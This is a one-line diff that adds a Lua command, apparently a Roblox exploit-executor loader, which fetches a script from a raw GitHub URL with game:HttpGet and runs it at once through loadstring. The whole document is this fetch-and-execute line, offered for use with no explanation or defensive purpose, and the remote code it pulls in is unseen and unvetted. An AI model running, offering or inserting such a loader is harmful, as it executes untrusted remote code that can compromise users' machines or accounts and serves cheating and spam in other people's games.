@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam1-9kmfmo0co8zpm9.lua"))()
